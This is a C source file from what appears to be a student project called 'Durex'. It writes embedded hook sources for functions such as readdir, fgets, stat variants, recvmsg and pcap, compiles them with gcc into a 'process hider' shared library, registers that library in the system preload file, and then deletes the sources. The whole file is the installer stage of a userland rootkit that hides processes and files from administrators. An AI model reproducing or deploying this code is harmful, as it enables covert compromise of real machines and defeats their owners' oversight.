/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   library.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/08/14 01:44:46 by root              #+#    #+#             */
/*   Updated: 2018/10/01 11:10:44 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* system */
#include <stdlib.h>
/* remove */
#include <stdio.h>
/* execvp */
#include <unistd.h>
/* waitpid */
#include <sys/types.h>
#include <sys/wait.h>

#include "main.h"

static int		install_failed(const char *msg, char *const src[], char *const files[], size_t i)
{
	if (msg)
		serverLog(msg, files[i]);
	for (size_t j = 0; j < i; j++) {
		if (src[j])
			remove(files[j]);
	}
	return 0;
}

static int		create_library(char *const files[], char *const src[], size_t size)
{
	int			fd;
	size_t		ret;

	serverLog("[INFO] - Creating library files...");
	for (size_t i = 0; i < size; i++) {
		if (!src[i])
			continue ;
		fd = open(files[i], O_CREAT | O_TRUNC | O_WRONLY, 0644);
		if (fd < 0) {
			return install_failed("[ERR] - Failed to create %s.", src, files, i);
		}
		ret = write(fd, src[i], mystrlen(src[i]));
		close(fd);
		if (ret != (size_t)mystrlen(src[i]))
			return install_failed("[ERR] - Failed to write %s.", src, files, i);
	}
	return 1;
}

static int		compile_library(char *const files[], char *const src[], size_t size)
{
	pid_t		pid;
	int			status;

	serverLog("[INFO] - Compiling library...");
	pid = fork();
	if (pid == 0) {
		execvp(files[0], files);
		exit(-1);
	} else if (pid > 0) {
		waitpid(pid, &status, 0);
		if (!WIFEXITED(status)) {
			serverLog("[ERR] - %d %d", status, WEXITSTATUS(status));
			return install_failed(NULL, src, files, size);
		}
	} else {
		return install_failed("[ERR] - Failed to fork.", src, files, size);
	}
	return 1;
}

static int		execute_library(char *const files[], char *const src[], size_t size)
{
	int			fd;
	size_t		ret;

	serverLog("[INFO] - Installing library...");
	fd = open(DUREX_PRELOAD, O_CREAT | O_TRUNC | O_WRONLY, 0600);
	if (fd >= 0) {
		ret = write(fd, DUREX_PROCESSHIDER_LIB, sizeof(DUREX_PROCESSHIDER_LIB));
		close(fd);
		if (ret == sizeof(DUREX_PROCESSHIDER_LIB)) {
			for (size_t i = 0; i < size; i++) {
				if (src[i])
					remove(files[i]);
			}
			return 1;
		}
		return install_failed("[ERR] - Can't write library.", src, files, size);
	}
	return install_failed("[ERR] - Can't open library.", src, files, size);
}

int				install_library()
{
	char	*const files[] = { "gcc", "-Wall", "-fPIC", "-shared", "-o", DUREX_PROCESSHIDER_LIB,
							   DUREX_FGETS_FILE, DUREX_LXSTAT_FILE, DUREX_NEWFSTATAT_FILE,
							   DUREX_PCAP_FILE, DUREX_READDIR_FILE, DUREX_RECVMSG_FILE,
							   DUREX_RM_FILE, DUREX_XSTAT_FILE, DUREX_OPEN_FILE,
							 "-ldl", NULL };
	char	*const src[] = { NULL, NULL, NULL, NULL, NULL, NULL,
							 DUREX_FGETS_SRC, DUREX_LXSTAT_SRC, DUREX_NEWFSTATAT_SRC,
							 DUREX_PCAP_SRC, DUREX_READDIR_SRC, DUREX_RECVMSG_SRC,
							 DUREX_RM_SRC, DUREX_XSTAT_SRC, DUREX_OPEN_SRC };
	size_t	size;

	size = sizeof(src) / sizeof(*src);
	return create_library(files, src, size) && compile_library(files, src, size) && execute_library(files, src, size);
}
